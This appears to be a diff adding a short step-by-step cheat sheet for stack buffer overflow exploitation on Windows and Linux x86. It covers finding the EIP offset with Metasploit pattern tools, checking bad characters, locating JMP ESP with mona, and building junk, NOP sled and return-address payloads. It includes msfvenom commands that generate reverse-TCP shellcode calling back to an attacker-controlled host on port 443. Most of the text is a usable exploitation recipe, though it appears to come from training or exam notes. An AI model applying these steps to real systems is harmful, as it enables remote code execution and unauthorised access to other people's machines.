@@ -1,0 +1,51 @@
+****************************************************** WINDOWS ****************************************************
+#1. create junk byte
+      pattern_create.rb -l [length]
+#2. send the junk byte to the program
+#3. copie the hex on the EIP and check with 
+      pattern_offset.rb -q [hex]
+#4. send bad chars to the application and check which ones are bad chars
+#5. Locate memory addr of JMP ESP or PUSH ESP, RET
+      1. *JMP ESP (opcode FFE4) 
+      2. *PUSH ESP, RET(opcode 54C3)
+
+      #To locate the address of above opearation
+    	1.!mona find -s "opcode" -m module
+	    #example:
+	    !mona find -s "\xff\xe4" -m vulnApp.exe
+	2.!mona jmp -r esp -m module
+#6. Generate shellcode with msfvenome
+      msfvenom -p windows/x86/shell_reverse_tcp LHOST=OUR_IP LPORT=443 -f python -b "BAD_CHARS_HERE"
+#7. Construct payload
+      junk = "\x41" * offset
+      jmp_esp = PUT YOUR JUMP ESP ADDR HERE  (in little endian)
+      nop = "\x90" * 16
+      shellcode = PUT YOUR SHELL CODE here
+      payload = junk + jump_esp + nop + shellcode 
+      payload += "\r\n"   #this is for Windows    
+****************************************************** WINDOWS ***************************************************
+
+
+****************************************************** Linux *****************************************************
+#First 4 steps is same as Windows
+
+#5. Locate the memory addr to place the shellcode
+      1. Linux does not offer JMP ESP nor PUSH ESP, RET
+      2. We need to overwrite the EIP with a return address to
+         our NOP code so that it "slides down" to our shellcode
+         Check picture for better understanding
+      3. Constructing the String
+	  junk = "\x41" * (offset - len(nop) - len(shellcode) - len(ret))
+  	  nop = "\x90" * 20
+          shellcode = "\x44" * 150  #placeholder for shellcode
+          ret = "\x42"*4            #placeholder for return address
+	  payload = junk + nop + shellcode + ret
+      4. Send the payload and locate the mem addr of the nop
+      5. Replace the ret with the nop addr (in little endian)
+      6. Generate shellcode and replace the bad chars
+	  msfvenom -p linux/x86/shell_reverse_tcp LHOST=OUR_IP LPORT=443 -f python -b "BAD_CHARS_HERE"
+      7. Replace the shellcode with generated
+      8. Send
+***************************************************** Linux *****************************************************
+
+
